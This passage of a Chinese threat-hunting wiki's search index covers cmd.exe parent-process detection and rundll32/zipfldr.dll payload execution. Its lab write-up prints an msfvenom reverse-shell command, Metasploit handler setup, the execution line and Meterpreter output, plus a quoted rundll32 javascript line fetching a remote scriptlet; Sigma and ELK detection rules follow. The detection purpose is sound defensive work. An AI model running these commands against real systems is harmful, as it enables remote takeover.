\uff0c\u5b83\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u53ef\u4ee5\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u7a0b\u5e8f\u672c\u5730\u6216\u8fdc\u7a0b\u4ea4\u4e92\uff0c\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u65b9\u5f0f\u8fd0\u884c\u547d\u4ee4\u884c\u754c\u9762\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u5305\u542b\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\u7684\u8fdb\u7a0b\u8c03\u7528\u6267\u884c\uff08\u4f8b\u5982 \u8ba1\u5212\u4efb\u52a1 \uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b Windows \u547d\u4ee4\u63d0\u793a\u7b26 \uff08 cmd.exe \uff09\u662f\u4e00\u4e2a\u4e3aWindows\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u547d\u4ee4\u884c\u754c\u9762\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002\u5b83\u63d0\u4f9b\u4e86\u8fd0\u884c\u5176\u4ed6\u7a0b\u5e8f\u7684\u80fd\u529b\uff0c\u4e5f\u6709\u51e0\u4e2a\u5185\u7f6e\u547d\u4ee4\uff0c\u4f8b\u5982 dir \uff0c copy \uff0c mkdir \uff0c\u548c type \uff0c\u4ee5\u53ca\u6279\u5904\u7406\u811a\u672c\uff08 .bat \uff09\u3002\u901a\u5e38\uff0c\u5f53\u7528\u6237\u8fd0\u884c\u547d\u4ee4\u63d0\u793a\u7b26\u65f6\uff0c\u7236\u8fdb\u7a0b explorer.exe \u6216\u8be5\u63d0\u793a\u7684\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u3002\u53ef\u80fd\u5b58\u5728\u81ea\u52a8\u7a0b\u5e8f\uff0c\u767b\u5f55\u811a\u672c\u6216\u7ba1\u7406\u5de5\u5177\uff0c\u7528\u4e8e\u542f\u52a8\u547d\u4ee4\u63d0\u793a\u7b26\u7684\u5b9e\u4f8b\u4ee5\u8fd0\u884c\u811a\u672c\u6216\u5176\u4ed6\u5185\u7f6e\u547d\u4ee4\u3002\u4ea7\u751f\u8fd9\u4e2a\u8fc7\u7a0b cmd.exe \u6765\u81ea\u67d0\u4e9b\u7236\u6bcd\u53ef\u80fd\u66f4\u80fd\u8bf4\u660e\u6076\u610f\u3002\u4f8b\u5982\uff0c\u5982\u679cAdobe Reader\u6216Outlook\u542f\u52a8\u547d\u4ee4shell\uff0c\u5219\u53ef\u80fd\u8868\u793a\u5df2\u52a0\u8f7d\u6076\u610f\u6587\u6863\u5e76\u5e94\u8fdb\u884c\u8c03\u67e5\u3002\u56e0\u6b64\uff0c\u901a\u8fc7\u5bfb\u627e\u5f02\u5e38\u7684\u7236\u8fdb\u7a0b cmd.exe \uff0c\u53ef\u4ee5\u68c0\u6d4b\u653b\u51fb\u8005\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 Windows 7 \u5728\u547d\u4ee4\u63d0\u793a\u7b26\u6216powershell\u4e2d\uff0c\u8fd0\u884ccmd.exe \u6d4b\u8bd5\u7559\u75d5 \u5982\u679c\u4f60\u719f\u6089windows\u4e8b\u4ef6ID\u6216\u8005\u7ecf\u5e38\u7559\u610f\u4f60\u7684windows\u65e5\u5fd7\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u770b\u5230\uff0c\u6bcf\u4e2a\u4e00\u4e2a\u8fdb\u7a0b\u7684\u521b\u5efa\uff0c\u7cfb\u7edf\u90fd\u4f1a\u8fdb\u884c\u8bb0\u5f55\u4ea7\u751f\u4e00\u4e2a\u4e8b\u4ef6\u3002\u6bd4\u5982windows\u7684\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6ID\u4e3a4688\uff0c\u8fdb\u7a0b\u5173\u95ed\u4e8b\u4ef6ID\u4e3a4689.\u5f53\u7136\u5728win7\u4e2d\uff0c\u4f60\u8fd8\u53ef\u4ee5\u770b\u5230\u8be6\u7ec6\u7684\u8fdb\u7a0b\u8def\u5f84\uff0c\u4f46\u662f\uff0c\u4f60\u6ca1\u6709\u529e\u6cd5\u770b\u5230\u7236\u8fdb\u7a0b\u662f\u4ec0\u4e48\uff1f\u6240\u4ee5\u4f60\u53ef\u80fd\u9700\u8981sysmon\u3002\u5728\u6700\u65b0\u7248\u672c\u7684windows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff08win10\uff09\u4e8b\u4ef6ID4688\u662f\u8bb0\u5f55\u4e86\u7236\u8fdb\u7a0b\u4e0e\u5b50\u8fdb\u7a0b\u7684\uff0c\u8fd9\u6709\u52a9\u4e8e\u66f4\u597d\u7684\u8fdb\u884c\u5a01\u80c1\u72e9\u730e\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def elk\u89c4\u5219 process = search Process:Create cmd = filter process where (exe == \"cmd.exe\") output cmd \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1059 https://attack.mitre.org/techniques/T1059/ windows\u91cd\u70b9\u76d1\u63a7\u4e8b\u4ef6ID\u8868 https://www.96007.club/2019/08/21/21/","title":"T1059-windows-\u8fdb\u7a0b\u751f\u6210CMD"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#t1059-windows-cmd","text":"","title":"T1059-windows-\u8fdb\u7a0b\u751f\u6210CMD"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#attck","text":"\u547d\u4ee4\u884c\u754c\u9762\u63d0\u4f9b\u4e86\u4e00\u79cd\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u8bb8\u591a\u7c7b\u578b\u7684\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u529f\u80fd\u3002windows\u7cfb\u7edf\u4e0a\u7684\u4e00\u4e2a\u793a\u4f8b\u547d\u4ee4\u884c\u754c\u9762\u662f cmd \uff0c\u5b83\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u53ef\u4ee5\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u7a0b\u5e8f\u672c\u5730\u6216\u8fdc\u7a0b\u4ea4\u4e92\uff0c\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u65b9\u5f0f\u8fd0\u884c\u547d\u4ee4\u884c\u754c\u9762\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u5305\u542b\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\u7684\u8fdb\u7a0b\u8c03\u7528\u6267\u884c\uff08\u4f8b\u5982 \u8ba1\u5212\u4efb\u52a1 \uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_1","text":"Windows \u547d\u4ee4\u63d0\u793a\u7b26 \uff08 cmd.exe \uff09\u662f\u4e00\u4e2a\u4e3aWindows\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u547d\u4ee4\u884c\u754c\u9762\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002\u5b83\u63d0\u4f9b\u4e86\u8fd0\u884c\u5176\u4ed6\u7a0b\u5e8f\u7684\u80fd\u529b\uff0c\u4e5f\u6709\u51e0\u4e2a\u5185\u7f6e\u547d\u4ee4\uff0c\u4f8b\u5982 dir \uff0c copy \uff0c mkdir \uff0c\u548c type \uff0c\u4ee5\u53ca\u6279\u5904\u7406\u811a\u672c\uff08 .bat \uff09\u3002\u901a\u5e38\uff0c\u5f53\u7528\u6237\u8fd0\u884c\u547d\u4ee4\u63d0\u793a\u7b26\u65f6\uff0c\u7236\u8fdb\u7a0b explorer.exe \u6216\u8be5\u63d0\u793a\u7684\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u3002\u53ef\u80fd\u5b58\u5728\u81ea\u52a8\u7a0b\u5e8f\uff0c\u767b\u5f55\u811a\u672c\u6216\u7ba1\u7406\u5de5\u5177\uff0c\u7528\u4e8e\u542f\u52a8\u547d\u4ee4\u63d0\u793a\u7b26\u7684\u5b9e\u4f8b\u4ee5\u8fd0\u884c\u811a\u672c\u6216\u5176\u4ed6\u5185\u7f6e\u547d\u4ee4\u3002\u4ea7\u751f\u8fd9\u4e2a\u8fc7\u7a0b cmd.exe \u6765\u81ea\u67d0\u4e9b\u7236\u6bcd\u53ef\u80fd\u66f4\u80fd\u8bf4\u660e\u6076\u610f\u3002\u4f8b\u5982\uff0c\u5982\u679cAdobe Reader\u6216Outlook\u542f\u52a8\u547d\u4ee4shell\uff0c\u5219\u53ef\u80fd\u8868\u793a\u5df2\u52a0\u8f7d\u6076\u610f\u6587\u6863\u5e76\u5e94\u8fdb\u884c\u8c03\u67e5\u3002\u56e0\u6b64\uff0c\u901a\u8fc7\u5bfb\u627e\u5f02\u5e38\u7684\u7236\u8fdb\u7a0b cmd.exe \uff0c\u53ef\u4ee5\u68c0\u6d4b\u653b\u51fb\u8005\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_3","text":"Windows 7 \u5728\u547d\u4ee4\u63d0\u793a\u7b26\u6216powershell\u4e2d\uff0c\u8fd0\u884ccmd.exe","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_4","text":"\u5982\u679c\u4f60\u719f\u6089windows\u4e8b\u4ef6ID\u6216\u8005\u7ecf\u5e38\u7559\u610f\u4f60\u7684windows\u65e5\u5fd7\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u770b\u5230\uff0c\u6bcf\u4e2a\u4e00\u4e2a\u8fdb\u7a0b\u7684\u521b\u5efa\uff0c\u7cfb\u7edf\u90fd\u4f1a\u8fdb\u884c\u8bb0\u5f55\u4ea7\u751f\u4e00\u4e2a\u4e8b\u4ef6\u3002\u6bd4\u5982windows\u7684\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6ID\u4e3a4688\uff0c\u8fdb\u7a0b\u5173\u95ed\u4e8b\u4ef6ID\u4e3a4689.\u5f53\u7136\u5728win7\u4e2d\uff0c\u4f60\u8fd8\u53ef\u4ee5\u770b\u5230\u8be6\u7ec6\u7684\u8fdb\u7a0b\u8def\u5f84\uff0c\u4f46\u662f\uff0c\u4f60\u6ca1\u6709\u529e\u6cd5\u770b\u5230\u7236\u8fdb\u7a0b\u662f\u4ec0\u4e48\uff1f\u6240\u4ee5\u4f60\u53ef\u80fd\u9700\u8981sysmon\u3002\u5728\u6700\u65b0\u7248\u672c\u7684windows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff08win10\uff09\u4e8b\u4ef6ID4688\u662f\u8bb0\u5f55\u4e86\u7236\u8fdb\u7a0b\u4e0e\u5b50\u8fdb\u7a0b\u7684\uff0c\u8fd9\u6709\u52a9\u4e8e\u66f4\u597d\u7684\u8fdb\u884c\u5a01\u80c1\u72e9\u730e\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#elk","text":"process = search Process:Create cmd = filter process where (exe == \"cmd.exe\") output cmd","title":"elk\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_7","text":"MITRE-ATT&CK-T1059 https://attack.mitre.org/techniques/T1059/ windows\u91cd\u70b9\u76d1\u63a7\u4e8b\u4ef6ID\u8868 https://www.96007.club/2019/08/21/21/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/","text":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Zipfldr.dll\u6267\u884cPayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002 Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002 Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002 \u6d4b\u8bd5\u6848\u4f8b zipfldr.dll\u81eaWindows xp\u5f00\u59cb\u81ea\u5e26\u7684zip\u6587\u4ef6\u538b\u7f29/\u89e3\u538b\u5de5\u5177\u7ec4\u4ef6\uff0c\u540c\u6837\u8be5\u5de5\u5177\u652f\u6301WinXP-Win10 \u5168\u7248\u672c\uff0czipfldr.dll\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64zipfldr.dll\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u4f46\u7531\u4e8e\u4e3adll\u6587\u4ef6\uff0c\u9700\u8c03\u7528rundll32.exe\u6765\u6267\u884c\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\zipfldr.dll C:\\Windows\\SysWOW64\\zipfldr.dll Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\zipfldr.dll C:\\Windows\\SysWOW64\\zipfldr.dll \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012 \u653b\u51fb\u5206\u6790 \u751f\u6210payload.dll root@12306Br0:~# msfvenom -p windows/meterpreter/reverse_tcp -b '\\x00\\x0b' LHOST=192.168.126.146 LPORT=4444 -f exe > shell.exe \u6267\u884c\u76d1\u542c \u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploits/multi/handler msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > set AutoRunScript migrate f AutoRunScript => migrate f msf5 exploit(multi/handler) > exploit \u9776\u673a\u6267\u884cpayload rundll32.exe zipfldr.dll,RouteTheCall .\\shell.exe #shell.exe\u5b58\u653e\u8def\u5f84\u4e0b\u6267\u884c \u53cd\u5f39shell msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Sending stage (180291 bytes) to 192.168.126.156 [*] Meterpreter session 6 opened (192.168.126.146:4444 -> 192.168.126.156:49176) at 2020-04-13 10:54:22 +0800 [*] Session ID 6 (192.168.126.146:4444 -> 192.168.126.156:49176) processing AutoRunScript 'migrate f' [!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate. [!] Example: run post/windows/manage/migrate OPTION=value [...] meterpreter > getuid Server username: WIN-IFPMACUK8BT\\Administrator \u6d4b\u8bd5\u7559\u75d5 \u5b89\u5168\u65e5\u5fd7\u80fd\u591f\u6e05\u6670\u7684\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u622a\u53d6windows\u5b89\u5168\u4e8b\u4ef64688\u8fdb\u7a0b\u521b\u5efa\u90e8\u5206\u5185\u5bb9\uff1a \u8fdb\u7a0b\u4fe1\u606f: #4688-1 \u65b0\u8fdb\u7a0b ID:0x918 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\System32\\rundll32.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x948 \u8fdb\u7a0b\u547d\u4ee4\u884c:rundll32.exe zipfldr.dll,RouteTheCall .\\shell.exe \u8fdb\u7a0b\u4fe1\u606f: #4688-2 \u65b0\u8fdb\u7a0b ID:0x94c \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Users\\Administrator\\Desktop\\a\\shell.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x918 \u8fdb\u7a0b\u547d\u4ee4\u884c:\"C:\\Users\\Administrator\\Desktop\\a\\shell.exe\" \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u53ef\u7591Rundll32\u6d3b\u52a8 description: \u57fa\u4e8e\u53c2\u6570\u68c0\u6d4b\u4e0erundll32\u76f8\u5173\u7684\u53ef\u7591\u8fdb\u7a0b status: experimental references: - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/ - https://twitter.com/Hexacorn/status/885258886428725250 - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52 tags: - attack.defense_evasion - attack.execution - attack.t1085 logsource: category: process_creation product: windows detection: selection: CommandLine: - '*\\rundll32.exe* url.dll,*OpenURL *' - '*\\rundll32.exe* url.dll,*OpenURLA *' - '*\\rundll32.exe* url.dll,*FileProtocolHandler *' - '*\\rundll32.exe* zipfldr.dll,*RouteTheCall *' - '*\\rundll32.exe* Shell32.dll,*Control_RunDLL *' - '*\\rundll32.exe javascript:*' - '* url.dll,*OpenURL *' - '* url.dll,*OpenURLA *' - '* url.dll,*FileProtocolHandler *' - '* zipfldr.dll,*RouteTheCall *' - '* Shell32.dll,*Control_RunDLL *' - '* javascript:*' - '*.RegisterXLL*' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium \u5efa\u8bae \u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1085 https://attack.mitre.org/techniques/T1085/ \u57fa\u4e8e\u767d\u540d\u5355\u7684Payload https://blog.csdn.net/weixin_30790841/article/details/101848854","title":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Zipfldr.dll\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#t1218-011-win-zipfldrdllpayload","text":"","title":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Zipfldr.dll\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#attck","text":"Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002 Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002 Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_1","text":"zipfldr.dll\u81eaWindows xp\u5f00\u59cb\u81ea\u5e26\u7684zip\u6587\u4ef6\u538b\u7f29/\u89e3\u538b\u5de5\u5177\u7ec4\u4ef6\uff0c\u540c\u6837\u8be5\u5de5\u5177\u652f\u6301WinXP-Win10 \u5168\u7248\u672c\uff0czipfldr.dll\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64zipfldr.dll\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u4f46\u7531\u4e8e\u4e3adll\u6587\u4ef6\uff0c\u9700\u8c03\u7528rundll32.exe\u6765\u6267\u884c\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\zipfldr.dll C:\\Windows\\SysWOW64\\zipfldr.dll Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\zipfldr.dll C:\\Windows\\SysWOW64\\zipfldr.dll","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_2","text":"windows 